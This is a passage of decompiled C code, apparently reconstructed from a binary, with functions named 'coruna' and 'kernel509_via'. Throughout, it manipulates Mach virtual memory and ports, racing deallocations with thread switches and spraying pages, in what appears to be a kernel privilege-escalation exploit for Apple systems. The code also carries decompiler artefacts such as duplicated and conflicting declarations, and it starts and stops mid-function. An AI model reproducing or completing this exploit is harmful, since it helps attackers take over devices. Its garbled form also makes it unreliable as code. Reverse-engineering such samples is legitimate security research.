  scratch = 0;
  _vm_allocate(*(vm_map_t *)ptr,&scratch,*(vm_size_t *)(handle + 0x448),1);
  *(vm_address_t *)(handle + 0x440) = scratch;
  u = *(unsigned long *)(handle + 0x448);
  if (u != 0) {
    size = 0;
    handle = *(long *)(handle + 0x438);
    do {
      *(uint8_t *)(handle + size) = 0x41;
      size = size + 0x4000;
    } while (size < u);
  }
  return;
}
void coruna_vm_allocate_9008(long handle)
{
  uint64_t *ptr;
  vm_address_t lv2;
  uint64_t u;
  uint64_t size;
  uint8_t *buf;
  vm_size_t size;
  unsigned long version;
  vm_address_t scratch;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t thread_attr;
  uint64_t host_info;
  uint64_t host_info;
  uint64_t serial_buf;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t action;
  uint64_t block_ctx;
  uint64_t block_ctx;
  uint64_t stack_guard;
  uint64_t stack_guard;
  uint64_t sa_saved;
  uint64_t sa_saved;
  uint64_t sa_new;
  uint64_t sa_new;
  uint64_t path_buf;
  uint64_t path_buf;
  uint64_t tmp_buf;
  uint64_t tmp_buf;
  uint64_t region;
  uint64_t region;
  uint64_t plist;
  uint64_t plist;
  uint64_t url_buf;
  uint64_t url_buf;
  uint64_t json_buf;
  uint64_t json_buf;
  vm_address_t frame;
  
  size = *(long *)(handle + 0x598) * 0x28000;
  *(vm_size_t *)(handle + 0x460) = size;
  buf = k_kernel_mach_task_self_slot;
  scratch = 0;
  _vm_allocate(*(vm_map_t *)k_kernel_mach_task_self_slot,&scratch,size,1);
  *(vm_address_t *)(handle + 0x450) = scratch;
  scratch = 0;
  _vm_allocate(*(vm_map_t *)buf,&scratch,*(long *)(handle + 0x460) + 0x8000,1);
  *(vm_address_t *)(handle + 0x458) = scratch;
  size = k_kernel_rodata_word_00042e78;
  u = k_kernel_rodata_word_42e70;
  scratch = 0;
  bootargs = 0;
  url_buf = 0;
  url_buf = 0;
  json_buf = 0;
  json_buf = 0;
  region = 0;
  region = 0;
  plist = 0;
  plist = 0;
  path_buf = 0;
  tmp_buf = 0;
  tmp_buf = 0;
  sa_saved = 0;
  sa_saved = 0;
  sa_new = 0;
  block_ctx = 0;
  block_ctx = 0;
  serial_buf = 0;
  serial_buf = 0;
  action = 0;
  action = 0;
  thread_attr = 0;
  host_info = 0;
  host_info = 0;
  bootargs = k_kernel_rodata_word_00042e78;
  scratch = k_kernel_rodata_word_42e70;
  thread_attr = 1;
  stack_guard = 4;
  stack_guard = 0x101c80000000000;
  sa_new = 0xffffffffffffffff;
  path_buf = 0xc008000000000;
  if (*(long *)(handle + 0x460) != 0) {
    version = 0;
    do {
      ptr = (uint64_t *)(version + *(long *)(handle + 0x450));
      ptr[0x19] = 0;
      ptr[0x18] = 0;
      ptr[0x1b] = 0;
      ptr[0x1a] = 0;
      ptr[0x1d] = 0;
      ptr[0x1c] = 0;
      ptr[0x1f] = 0;
      ptr[0x1e] = 0;
      ptr[0x11] = 0;
      ptr[0x10] = 0;
      ptr[0x13] = 0xffffffffffffffff;
      ptr[0x12] = 0;
      ptr[0x15] = 0xc008000000000;
      ptr[0x14] = 0;
      ptr[0x17] = 0;
      ptr[0x16] = 0;
      ptr[9] = 0;
      ptr[8] = 0;
      ptr[0xb] = 0;
      ptr[10] = 0;
      ptr[0xd] = 0;
      ptr[0xc] = 0;
      ptr[0xf] = 0x101c80000000000;
      ptr[0xe] = 4;
      ptr[1] = u;
      *ptr = 0;
      ptr[3] = 0;
      ptr[2] = size;
      ptr[5] = 1;
      ptr[4] = 0;
      ptr[7] = 0;
      ptr[6] = 0;
      version = version + 0x100;
    } while (version < *(unsigned long *)(handle + 0x460));
    if (*(unsigned long *)(handle + 0x460) != 0) {
      version = 0;
      do {
        lv2 = version + *(long *)(handle + 0x458);
        frame = lv2;
        _vm_allocate(*(vm_map_t *)buf,&frame,0x4000,0x4002);
        coruna_vm_remap_7d00(lv2,0x4000,0);
        version = version + 0x4000;
      } while (version < *(unsigned long *)(handle + 0x460));
    }
  }
  return;
}
void coruna_vm_allocate_9204(long handle)
{
  vm_address_t scratch;
  
  scratch = 0;
  _vm_allocate(*(vm_map_t *)k_kernel_mach_task_self_slot,&scratch,0xc000,1);
  *(vm_address_t *)(handle + 0x4f0) = scratch;
  coruna_vm_allocate_807c(handle);
  coruna_vm_region_recurse_64_8ce0(handle);
  coruna_vm_allocate_8db0(handle);
  coruna_vm_allocate_8ea8(handle);
  coruna_vm_allocate_8f4c(handle);
  coruna_vm_allocate_9008(handle);
  return;
}
void coruna_mach_port_deallocate(uint64_t val)
{
  uint8_t *ptr;
  int err;
  void *ptr;
  long extraout_x1;
  vm_address_t address;
  vm_address_t scratch;
  
  ptr = _calloc(1,0x40);
  ptr = k_kernel_mach_task_self_slot;
  scratch = 0;
  _vm_allocate(*(vm_map_t *)k_kernel_mach_task_self_slot,&scratch,0xc000,1);
  *(vm_address_t *)((long)ptr + 0x38) = scratch;
  do {
    err = coruna_mach_make_memory_entry_64_862c(val,(long)ptr + 0x10);
  } while (err == 0);
  _thread_switch(0,2,0);
  _mach_port_deallocate(*(ipc_space_t *)ptr,*(mach_port_name_t *)((long)ptr + 0x20));
  *(uint32_t *)((long)ptr + 0x20) = 0;
  address = *(vm_address_t *)((long)ptr + 0x38);
  coruna_vm_remap_7d00(address,0xc000,0);
  coruna_vm_region_recurse_64(address);
  if (extraout_x1 != *(long *)((long)ptr + 0x10)) {
    _vm_deallocate(*(vm_map_t *)ptr,address,0xc000);
    *(uint64_t *)((long)ptr + 0x38) = 0;
    *(uint64_t *)((long)ptr + 8) = 1;
  }
  return;
}
void coruna_mach_port_deallocate_93a8(long handle,uint size)
{
  uint8_t *ptr;
  int err;
  void *ptr;
  long handle;
  uint64_t u;
  long extraout_x1;
  long extraout_x1_00;
  long extraout_x1_01;
  long extraout_x1_02;
  long extraout_x1_03;
  long extraout_x1_04;
  vm_address_t lv6;
  vm_prot_t scratch [2];
  vm_address_t bootargs;
  
  ptr = _calloc(1,0x100);
  ptr = k_kernel_mach_task_self_slot;
  bootargs = 0;
  _vm_allocate(*(vm_map_t *)k_kernel_mach_task_self_slot,&bootargs,0x18000,1);
  *(vm_address_t *)((long)ptr + 0x88) = bootargs;
  do {
    err = coruna_mach_make_memory_entry_64_862c(handle,(long)ptr + 0x10);
  } while (err == 0);
  _thread_switch(0,2,0);
  _mach_port_deallocate(*(ipc_space_t *)ptr,*(mach_port_name_t *)((long)ptr + 0x20));
  *(uint32_t *)((long)ptr + 0x20) = 0;
  **(uint8_t **)((long)ptr + 0x88) = 0x41;
  coruna_vm_region_recurse_64(*(uint64_t *)((long)ptr + 0x88));
  if (extraout_x1 == *(long *)((long)ptr + 0x10)) {
    bootargs = 0;
    _vm_allocate(*(vm_map_t *)ptr,&bootargs,0x14000,1);
    *(vm_address_t *)((long)ptr + 0x90) = bootargs;
    _vm_copy(*(vm_map_t *)ptr,*(long *)((long)ptr + 0x88) + 0x4000,0x14000,bootargs);
    do {
      err = coruna_mach_make_memory_entry_64_862c(handle,(long)ptr + 0x38);
    } while (err == 0);
    _thread_switch(0,2,0);
    _mach_port_deallocate(*(ipc_space_t *)ptr,*(mach_port_name_t *)((long)ptr + 0x48));
    *(uint32_t *)((long)ptr + 0x48) = 0;
    *(uint8_t *)(*(long *)((long)ptr + 0x90) + 0x10000) = 0x41;
    coruna_vm_region_recurse_64(*(uint64_t *)((long)ptr + 0x90));
    if (extraout_x1_00 == *(long *)((long)ptr + 0x38)) {
      bootargs = 0;
      _vm_allocate(*(vm_map_t *)ptr,&bootargs,0x10000,1);
      *(vm_address_t *)((long)ptr + 0x98) = bootargs;
      _vm_copy(*(vm_map_t *)ptr,*(vm_address_t *)((long)ptr + 0x90),0x10000,bootargs);
      do {
        err = coruna_mach_make_memory_entry_64_862c(handle,(long)ptr + 0x60);
      } while (err == 0);
      _thread_switch(0,2,0);
      _mach_port_deallocate(*(ipc_space_t *)ptr,*(mach_port_name_t *)((long)ptr + 0x70));
      *(uint32_t *)((long)ptr + 0x70) = 0;
      *(uint8_t *)(*(long *)((long)ptr + 0x98) + 0x8000) = 0x41;
      coruna_vm_region_recurse_64(*(uint64_t *)((long)ptr + 0x98));
      if (extraout_x1_01 == *(long *)((long)ptr + 0x60)) {
        handle = coruna_vm_remap(*(uint64_t *)((long)ptr + 0x98),0x10000,0);
        *(long *)((long)ptr + 0xa0) = handle;
        bootargs = handle + 0x4000;
        _vm_allocate(*(vm_map_t *)ptr,&bootargs,0xc000,0x4000);
        _vm_deallocate(*(vm_map_t *)ptr,*(vm_address_t *)((long)ptr + 0x90),0x14000);
        *(uint64_t *)((long)ptr + 0x90) = 0;
        _vm_deallocate(*(vm_map_t *)ptr,*(vm_address_t *)((long)ptr + 0x88),0x18000);
        *(uint64_t *)((long)ptr + 0x88) = 0;
        _thread_switch(0,2,0);
        _vm_deallocate(*(vm_map_t *)ptr,*(vm_address_t *)((long)ptr + 0x18),0x4000);
        *(uint64_t *)((long)ptr + 0x18) = 0;
        u = coruna_vm_remap(*(uint64_t *)((long)ptr + 0x98),0x10000,1);
        *(uint64_t *)((long)ptr + 0xa8) = u;
        bootargs = 0;
        _vm_allocate(*(vm_map_t *)ptr,&bootargs,0x10000,1);
        *(vm_address_t *)((long)ptr + 0xb0) = bootargs;
        bootargs = 0;
        _vm_allocate(*(vm_map_t *)ptr,&bootargs,0x10000,1);
        *(vm_address_t *)((long)ptr + 0xb8) = bootargs;
        _vm_copy(*(vm_map_t *)ptr,*(vm_address_t *)((long)ptr + 0xa8),0x10000,
                 *(vm_address_t *)((long)ptr + 0xb0));
        _vm_copy(*(vm_map_t *)ptr,*(vm_address_t *)((long)ptr + 0xa8),0x10000,
                 *(vm_address_t *)((long)ptr + 0xb8));
        _vm_deallocate(*(vm_map_t *)ptr,*(vm_address_t *)((long)ptr + 0x98),0x10000);
        *(uint64_t *)((long)ptr + 0x98) = 0;
        lv6 = *(long *)((long)ptr + 0xa8) + 0x8000;
        _vm_protect(*(vm_map_t *)ptr,lv6,0x4000,0,1);
        coruna_vm_region_recurse_64(lv6);
        _vm_protect(*(vm_map_t *)ptr,lv6,0x4000,0,3);
        if (extraout_x1_02 == *(long *)((long)ptr + 0x10)) {
          bootargs = 0;
          _vm_allocate(*(vm_map_t *)ptr,&bootargs,0x10000,1);
          lv6 = bootargs;
          _vm_copy(*(vm_map_t *)ptr,bootargs,0x10000,*(vm_address_t *)((long)ptr + 0xa0));
          _vm_deallocate(*(vm_map_t *)ptr,lv6,0x10000);
          _vm_deallocate(*(vm_map_t *)ptr,*(long *)((long)ptr + 0xa0) + 0x4000,0xc000);
          bootargs = 0;
          _vm_allocate(*(vm_map_t *)ptr,&bootargs,0x10000,1);
          *(vm_address_t *)((long)ptr + 0xc0) = bootargs;
          _thread_switch(0,2,0);
          _vm_deallocate(*(vm_map_t *)ptr,*(vm_address_t *)((long)ptr + 0x40),0x4000);
          *(uint64_t *)((long)ptr + 0x40) = 0;
          *(uint8_t *)(*(long *)((long)ptr + 0xc0) + 0x4000) = 0x41;
          u = coruna_vm_remap(*(uint64_t *)((long)ptr + 0xc0),0x10000,0);
          *(uint64_t *)((long)ptr + 200) = u;
          coruna_vm_region_recurse_64(*(uint64_t *)((long)ptr + 0xc0));
          if (extraout_x1_03 == *(long *)((long)ptr + 0x38)) {
            u = *(uint64_t *)((long)ptr + 0xb0);
            *(uint64_t *)((long)ptr + 0xd0) = u;
            *(uint64_t *)((long)ptr + 0xb0) = 0;
            u = coruna_vm_remap(u,0x10000,0);
            *(uint64_t *)((long)ptr + 0xd8) = u;
            if ((size & 1) == 0) {
              **(uint8_t **)((long)ptr + 0xd0) = 0x41;
            }
            _thread_switch(0,2,0);
            _vm_deallocate(*(vm_map_t *)ptr,*(vm_address_t *)((long)ptr + 0xb8),0x10000);
            *(uint64_t *)((long)ptr + 0xb8) = 0;
            _vm_deallocate(*(vm_map_t *)ptr,*(vm_address_t *)((long)ptr + 0x68),0x4000);
            *(uint64_t *)((long)ptr + 0x68) = 0;
            _vm_deallocate(*(vm_map_t *)ptr,*(vm_address_t *)((long)ptr + 200),0x10000);
            *(uint64_t *)((long)ptr + 200) = 0;
            _vm_deallocate(*(vm_map_t *)ptr,*(vm_address_t *)((long)ptr + 0xc0),0x10000);
            *(uint64_t *)((long)ptr + 0xc0) = 0;
            u = *(uint64_t *)((long)ptr + 0xa8);
            *(uint64_t *)((long)ptr + 0xe0) = u;
            *(uint64_t *)((long)ptr + 0xa8) = 0;
            u = coruna_vm_remap(u,0x10000,0);
            *(uint64_t *)((long)ptr + 0xe8) = u;
            lv6 = *(vm_address_t *)((long)ptr + 0xe0);
            _vm_protect(*(vm_map_t *)ptr,lv6,0x4000,0,1);
            coruna_vm_region_recurse_64(lv6);
            _vm_protect(*(vm_map_t *)ptr,lv6,0x4000,0,3);
            if (extraout_x1_04 == *(long *)((long)ptr + 0x38)) {
              if (size != 0) {
                u = coruna_vm_remap(*(long *)((long)ptr + 0xd0) + 0x4000,0xc000,1);
                *(uint64_t *)((long)ptr + 0xf0) = u;
                bootargs = 0;
                _vm_allocate(*(vm_map_t *)ptr,&bootargs,0xc000,1);
                *(vm_address_t *)((long)ptr + 0xf8) = bootargs;
                _vm_copy(*(vm_map_t *)ptr,*(vm_address_t *)((long)ptr + 0xf0),0xc000,bootargs)
                ;
                return;
              }
              _vm_deallocate(*(vm_map_t *)ptr,*(long *)((long)ptr + 0xd0) + 0xc000,0x4000);
              _vm_deallocate(*(vm_map_t *)ptr,*(long *)((long)ptr + 0xd8) + 0xc000,0x4000);
              bootargs = *(vm_address_t *)(handle + 0x4f0);
              if (bootargs == 0) {
                return;
              }
              scratch[0] = 0;
              scratch[1] = 0;
              _vm_remap(*(vm_map_t *)ptr,&bootargs,0xc000,0,0x4000,*(vm_map_t *)ptr,
                        *(vm_address_t *)((long)ptr + 0xd8),0,scratch + 1,scratch,1);
              _vm_deallocate(*(vm_map_t *)ptr,*(vm_address_t *)((long)ptr + 0xd8),0xc000);
              *(uint64_t *)((long)ptr + 0xd8) = *(uint64_t *)(handle + 0x4f0);
              *(uint64_t *)(handle + 0x4f0) = 0;
              return;
            }
            u = 6;
          }
          else {
            u = 5;
          }
        }
        else {
          u = 4;
        }
      }
      else {
        u = 3;
      }
    }
    else {
      u = 2;
    }
  }
  else {
    u = 1;
  }
  *(uint64_t *)((long)ptr + 8) = u;
  return;
}
void coruna_kernel509_via_mach_port_deallocate(uint64_t val,long handle)
{
  long handle;
  uint64_t *ptr;
  long addr;
  
  addr = 0;
  do {
    while (ptr = (uint64_t *)coruna_mach_port_deallocate(val), ptr[1] != 0) {
      handle = *(long *)(handle + 0x20);
      *ptr = *(uint64_t *)(handle + 0x18);
      *(uint64_t **)(handle + 0x18) = ptr;
      *(long *)(handle + 0x20) = handle + 1;
    }
    *(uint64_t **)(handle + addr * 8) = ptr;
    addr = addr + 1;
  } while (addr != 2);
  return;
}
void coruna_kernel509_via_mach_port_deallocate_93a8(long handle,uint64_t *val)
{
  long handle;
  uint64_t *ptr;
  
  while (ptr = (uint64_t *)coruna_mach_port_deallocate_93a8(handle,(uint64_t *)(handle + 0x4b8) == val),
        ptr[1] != 0) {
    handle = val[2];
    *ptr = val[1];
    val[1] = ptr;
    val[2] = handle + 1;
  }
  *val = ptr;
  if (val[2] != 0) {
    val = val + 1;
    do {
      val = (uint64_t *)*val;
    } while (val != (uint64_t *)0x0);
  }
  return;
}
void coruna_kernel509_via_kernel509_via_mach_port_deallocate(long handle)
{
  coruna_kernel509_via_mach_port_deallocate(handle,handle + 0x468);
  coruna_kernel509_via_mach_port_deallocate(handle,handle + 0x490);
  coruna_kernel509_via_mach_port_deallocate_93a8(handle,handle + 0x4b8);
  coruna_kernel509_via_mach_port_deallocate_93a8(handle,handle + 0x4d8);
  return;
}
void coruna_vm_copy_9b64(long handle)
{
  uint8_t *ptr;
  
  ptr = k_kernel_mach_task_self_slot;
  *(uint32_t *)(handle + 0x500) = 1;
  _vm_copy(*(vm_map_t *)ptr,*(vm_address_t *)(*(long *)(handle + 0x4b8) + 0xf0),0xc000,
           *(vm_address_t *)(*(long *)(handle + 0x4d8) + 0xd0));
  return;
}
void coruna_vm_deallocate(long handle)
{
  uint8_t *ptr;
  long handle;
  long addr;
  
  coruna_mach_timebase_info_7e88();
  ptr = k_kernel_mach_task_self_slot;
  handle = 0;
  do {
    addr = *(long *)(handle + 0x470 + handle);
    _vm_deallocate(*(vm_map_t *)ptr,*(vm_address_t *)(addr + 0x18),0x4000);
    *(uint64_t *)(addr + 0x18) = 0;
    handle = handle + -8;
  } while (handle != -0x10);
  _vm_copy(*(vm_map_t *)ptr,*(vm_address_t *)(handle + 0x438),*(vm_size_t *)(handle + 0x448),
           *(vm_address_t *)(handle + 0x440));
  handle = 0;
  do {
    addr = *(long *)(handle + 0x498 + handle);
    _vm_deallocate(*(vm_map_t *)ptr,*(vm_address_t *)(addr + 0x18),0x4000);
    *(uint64_t *)(addr + 0x18) = 0;
    handle = handle + -8;
  } while (handle != -0x10);
  *(uint32_t *)(handle + 0x510) = 1;
  _vm_copy(*(vm_map_t *)ptr,*(vm_address_t *)(*(long *)(handle + 0x4d8) + 0xd0),0xc000,
           0xffffffffffffffff);
  return;
}
void coruna_vm_allocate_9cc0(long handle,unsigned long arg)
{
  long *ptr;
  long *buf;
  uint8_t *ptr;
  long handle;
  long addr;
  long off;
  long base;
  long ctx_val;
  unsigned long u;
  long serial;
  long *scratch;
  
  ptr = (long *)(*(long *)(handle + 0x20) + 0x4000);
  buf = (long *)(*(long *)(handle + 0x20) + 0x8000);
  addr = *(long *)(handle + 0x440);
  ctx_val = *(long *)(handle + 0x5d8);
  off = *(long *)(handle + 0x5e0);
  *(uint64_t *)(ctx_val + addr) = 0xaaaa1111aaaa1111;
  *(uint64_t *)(off + addr) = 0xaaaa1111aaaa1111;
  ptr = k_kernel_mach_task_self_slot;
  serial = 200000;
  handle = -0x4444dddd4444dddd;
  while( true ) {
    base = handle;
    scratch = ptr;
    _vm_allocate(*(vm_map_t *)ptr,(vm_address_t *)&scratch,0x4000,0x4000);
    *ptr = base;
    DataSynchronizationBarrier(2,2,0);
    if (base == *(long *)(addr + ctx_val)) {
      *(uint8_t *)(handle + 0x28) = 1;
      if ((*(char *)(handle + 0x29) == '\0') && (arg != 0)) {
      u = 1;
      do {
      base = base + 1;
      scratch = buf;
      _vm_allocate(*(vm_map_t *)ptr,(vm_address_t *)&scratch,0x4000,0x4000);
      *buf = base;
      DataSynchronizationBarrier(2,2,0);
      if (base == *(long *)(addr + off)) {
      *(uint8_t *)(handle + 0x29) = 1;
      return;
      }
      u = u + 1;
      } while (u <= arg);
      }
      return;
    }
    if (base == *(long *)(addr + off)) break;
    serial = serial + -1;
    handle = base + 1;
    if (serial == 0) {
fail:
      if ((*(char *)(handle + 0x29) == '\0') && (arg != 0)) {
        u = 1;
        do {
          base = base + 1;
          scratch = buf;
          _vm_allocate(*(vm_map_t *)ptr,(vm_address_t *)&scratch,0x4000,0x4000);
          *buf = base;
          DataSynchronizationBarrier(2,2,0);
          if (base == *(long *)(addr + off)) {
            *(uint8_t *)(handle + 0x29) = 1;
            return;
          }
          u = u + 1;
        } while (u <= arg);
      }
      return;
    }
  }
  *(uint8_t *)(handle + 0x29) = 1;
  if ((*(char *)(handle + 0x29) == '\0') && (arg != 0)) {
  u = 1;
  do {
  base = base + 1;
  scratch = buf;
  _vm_allocate(*(vm_map_t *)ptr,(vm_address_t *)&scratch,0x4000,0x4000);
  *buf = base;
  DataSynchronizationBarrier(2,2,0);
  if (base == *(long *)(addr + off)) {
  *(uint8_t *)(handle + 0x29) = 1;
  return;
  }
  u = u + 1;
  } while (u <= arg);
  }
  return;
}
void coruna_vm_allocate_9e34(long handle,int flags)
{
  long *ptr;
  uint8_t *ptr;
  long handle;
  long addr;
  long off;
  long base;
  long *scratch;
  
  ptr = (long *)(*(long *)(handle + 0x20) + 0x4000);
  handle = *(long *)(handle + 0x440);
  off = 0x5d8;
  if (flags == 0) {
    off = 0x5e0;
  }
  addr = *(long *)(handle + off);
  *(uint64_t *)(addr + handle) = 0xaaaa1111aaaa1111;
  ptr = k_kernel_mach_task_self_slot;
  off = -0x4444dddd4444dddd;
  base = 200000;
  do {
    scratch = ptr;
    _vm_allocate(*(vm_map_t *)ptr,(vm_address_t *)&scratch,0x4000,0x4000);
    *ptr = off;
    if (off == *(long *)(handle + addr)) {
      if (flags != 0) {
        *(uint8_t *)(handle + 0x28) = 1;
        return;
      }
      *(uint8_t *)(handle + 0x29) = 1;
      return;
    }
    off = off + 1;
    base = base + -1;
  } while (base != 0);
  return;
}
void coruna_pthread_create(void *ctx)
{
  byte *ptr;
  byte err;
  bool status;
  int err;
  void **lppv5;
  long extraout_x1;
  long handle;
  bool flags;
  
  ptr = (byte *)((long)ctx + 0x500);
  ptr[0] = 0;
  ptr[1] = 0;
  ptr[2] = 0;
  ptr[3] = 0;
  lppv5 = (void **)coruna_kernel509_via_helper_5d2c_419fc(coruna_vm_copy_9b64);
  err = _pthread_create((pthread_t *)((long)ctx + 0x4f8),(pthread_attr_t *)0x0,lppv5,ctx
                         );
  if (err != 0) {
    ___error();
  }
  err = *ptr;
  while ((err & 1) == 0) {
    _usleep(1000);
    err = *(byte *)((long)ctx + 0x500);
  }
  _usleep(5000);
  ptr = (byte *)((long)ctx + 0x510);
  ptr[0] = 0;
  ptr[1] = 0;
  ptr[2] = 0;
  ptr[3] = 0;
  lppv5 = (void **)coruna_kernel509_via_helper_5d2c_419fc(coruna_vm_deallocate);
  err = _pthread_create((pthread_t *)((long)ctx + 0x508),(pthread_attr_t *)0x0,lppv5,ctx
                         );
  if (err != 0) {
    ___error();
  }
  err = *ptr;
  while ((err & 1) == 0) {
    _usleep(1000);
    err = *(byte *)((long)ctx + 0x510);
  }
  _usleep(5000);
  coruna_vm_region_recurse_64(*(uint64_t *)((long)ctx + 0x440));
  handle = 0;
  status = true;
  do {
    flags = status;
    if (extraout_x1 == *(long *)(*(long *)((long)ctx + handle * 8 + 0x468) + 0x10)) {
      *(long *)((long)ctx + 0x478) = handle;
      break;
    }
    handle = 1;
    status = false;
  } while (flags);
  handle = 0;
  status = true;
  do {
    flags = status;
    err = coruna_vm_region_recurse_64(*(uint64_t *)(*(long *)((long)ctx + handle * 8 + 0x490) + 0x38));
    if (err == 2) {
      *(long *)((long)ctx + 0x4a0) = handle;
      return;
    }
    handle = 1;
    status = false;
  } while (flags);
  return;
}
void coruna_madvise(long handle,long addr_2)
{
  int err;
  
  err = _madvise(*(long *)(handle + 0x20) + 0xc000,addr_2 << 0xe,3);
  if (err != 0) {
    ___error();
  }
  return;
}
void coruna_thread_switch(long handle)
{
  uint8_t *ptr;
  vm_address_t lv2;
  long handle;
  long addr;
  vm_address_t scratch;
  
  ptr = k_kernel_mach_task_self_slot;
  scratch = 0;
  _vm_allocate(*(vm_map_t *)k_kernel_mach_task_self_slot,&scratch,0xc000,1);
  lv2 = scratch;
  handle = *(long *)(handle + 0x440);
  addr = *(long *)(handle + 0x5e0);
  *(uint8_t *)(*(long *)(handle + 0x5d8) + handle) = 0x41;
  *(uint8_t *)(addr + handle) = 0x41;
  handle = *(long *)(handle + *(long *)(handle + 0x478) * 8 + 0x468);
  _vm_deallocate(*(vm_map_t *)ptr,*(vm_address_t *)(handle + 0x38),0xc000);
  *(uint64_t *)(handle + 0x38) = 0;
  _thread_switch(0,2,0);
  handle = *(long *)(handle + 0x490 + *(long *)(handle + 0x4a0) * 8);
  _vm_deallocate(*(vm_map_t *)ptr,*(vm_address_t *)(handle + 0x38),0xc000);
  *(uint64_t *)(handle + 0x38) = 0;
  coruna_vm_remap_7d00(lv2,0xc000,0);
  coruna_vm_region_recurse_64(lv2);
  *(vm_address_t *)(*(long *)(handle + 0x490 + *(long *)(handle + 0x4a0) * 8) + 0x38) = lv2;
  coruna_vm_allocate_9cc0(handle,*(uint64_t *)(handle + 0x598));
  coruna_madvise(handle,*(long *)(handle + 0x598) + -4);
  handle = 0;
  do {
    coruna_vm_remap_7d00(*(uint64_t *)(*(long *)(handle + 0x30) + handle),0x4000,0);
    handle = handle + 8;
  } while (handle != 800000);
  return;
}
void coruna_vm_deallocate_a23c(long handle)
{
  uint8_t *ptr;
  int err;
  long handle;
  vm_address_t scratch;
  
  ptr = k_kernel_mach_task_self_slot;
  handle = *(long *)(handle + 0x20);
  scratch = handle + 0x4000;
  if ((*(char *)(handle + 0x28) != '\0') && (*(char *)(handle + 0x29) != '\0')) {
    _vm_allocate(*(vm_map_t *)k_kernel_mach_task_self_slot,&scratch,0x4000,0x4000);
    scratch = handle + 0x8000;
  }
  _vm_allocate(*(vm_map_t *)ptr,&scratch,0x4000,0x4000);
  handle = *(long *)(handle + 0x4d8);
  _vm_deallocate(*(vm_map_t *)ptr,*(vm_address_t *)(handle + 0xa0),0x4000);
  *(uint64_t *)(handle + 0xa0) = 0;
  err = _pthread_join(*(pthread_t *)(handle + 0x508),(void **)0x0);
  if (err != 0) {
    ___error();
  }
  *(uint64_t *)(handle + 0x508) = 0;
  handle = *(long *)(handle + 0x4b8);
  _vm_deallocate(*(vm_map_t *)ptr,*(vm_address_t *)(handle + 0xa0),0x4000);
  *(uint64_t *)(handle + 0xa0) = 0;
  err = _pthread_join(*(pthread_t *)(handle + 0x4f8),(void **)0x0);
  if (err != 0) {
    ___error();
  }
  *(uint64_t *)(handle + 0x4f8) = 0;
  return;
}
void coruna_vm_deallocate_a348(long handle)
{
  long handle;
  char err;
  uint8_t *ptr;
  int *err;
  vm_address_t address;
  long addr;
  long off;
  long base;
  uint8_t u[16];
  
  err = *(char *)(handle + 0x28);
  if ((err == '\0') || (*(char *)(handle + 0x29) == '\0')) {
    *(uint16_t *)(handle + 0x28) = 0;
    coruna_vm_allocate_9e34(handle,err != '\0');
  }
  else {
    *(uint16_t *)(handle + 0x28) = 0;
    coruna_vm_allocate_9cc0(handle,*(uint64_t *)(handle + 0x598));
  }
  ptr = k_kernel_mach_task_self_slot;
  _vm_copy(*(vm_map_t *)k_kernel_mach_task_self_slot,*(vm_address_t *)(handle + 0x450),
           *(vm_size_t *)(handle + 0x460),*(vm_address_t *)(handle + 0x458));
  addr = 0;
  off = 0;
  base = 0;
  do {
    address = *(vm_address_t *)(*(long *)(handle + 0x30) + base * 8);
    u = coruna_vm_region_recurse_64(address);
    if (u >> 0x20 == 0) {
      if (addr == 0) {
        addr = base + 1;
      }
      handle = handle + off * 0x10;
      *(vm_address_t *)(handle + 0x38) = address;
      *(long *)(handle + 0x40) = u;
      off = off + 1;
    }
    else {
      _vm_deallocate(*(vm_map_t *)ptr,address,0x4000);
    }
    base = base + 1;
  } while (base != 100000);
  *(long *)(handle + 0x590) = addr;
  err = (int *)coruna_kernel509_via_helper_5d2c_419fc(coruna_fn_ptr_cast);
  _qsort((void *)(handle + 0x38),0x40,0x10,err);
  _free(*(void **)(handle + 0x30));
  *(uint64_t *)(handle + 0x30) = 0;
  return;
}
void coruna_kernel509_via_thread_switch(uint64_t val)
{
  coruna_pthread_create();
  coruna_thread_switch(val);
  coruna_vm_deallocate_a23c(val);
  coruna_vm_deallocate_a348(val);
  return;
}
void coruna_thread_switch_a4e8(long handle)
{
  uint64_t u;
  uint64_t size;
  uint64_t version;
  uint8_t *ptr;
  vm_address_t lv5;
  long handle;
  uint64_t *buf;
  uint32_t port;
  unsigned long tag;
  long addr;
  uint32_t kind;
  uint32_t type_id;
  unsigned long type_id_8;
  uint64_t scratch;
  uint64_t scratch;
  vm_address_t bootargs;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t thread_attr;
  uint64_t host_info;
  uint64_t host_info;
  uint64_t serial_buf;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t action;
  uint64_t block_ctx;
  uint64_t block_ctx;
  uint64_t stack_guard;
  uint64_t stack_guard;
  uint64_t sa_saved;
  uint64_t sa_saved;
  uint64_t sa_new;
  uint64_t sa_new;
  uint64_t path_buf;
  uint64_t path_buf;
  uint64_t tmp_buf;
  uint64_t tmp_buf;
  uint64_t region;
  uint64_t region;
  uint64_t plist;
  uint64_t plist;
  uint64_t url_buf;
  uint64_t url_buf;
  uint64_t json_buf;
  uint64_t json_buf;
  uint64_t frame;
  uint64_t frame;
  
  ptr = k_kernel_mach_task_self_slot;
  bootargs = 0;
  _vm_allocate(*(vm_map_t *)k_kernel_mach_task_self_slot,&bootargs,0xc000,1);
  *(vm_address_t *)(handle + 0x580) = bootargs;
  *(vm_address_t *)(handle + 0x560) = bootargs;
  _vm_allocate(*(vm_map_t *)ptr,&bootargs,0x4000,0x4000);
  _thread_switch(0,2,0);
  _vm_deallocate(*(vm_map_t *)ptr,*(vm_address_t *)(handle + 0x38),0x4000);
  *(uint64_t *)(handle + 0x38) = 0;
  coruna_vm_remap_7d00(*(uint64_t *)(handle + 0x560),0x4000,0);
  coruna_vm_region_recurse_64(*(uint64_t *)(handle + 0x560));
  bootargs = 0;
  _vm_allocate(*(vm_map_t *)ptr,&bootargs,0x10000,1);
  *(vm_address_t *)(handle + 0x578) = bootargs;
  _vm_allocate(*(vm_map_t *)ptr,&bootargs,0x4000,0x4002);
  coruna_vm_remap_7d00(*(uint64_t *)(handle + 0x578),0x4000,0);
  lv5 = *(long *)(handle + 0x578) + 0x4000;
  bootargs = lv5;
  _vm_allocate(*(vm_map_t *)ptr,&bootargs,0x4000,0x4000);
  _thread_switch(0,2,0);
  _vm_deallocate(*(vm_map_t *)ptr,*(vm_address_t *)(handle + 0x48),0x4000);
  *(uint64_t *)(handle + 0x48) = 0;
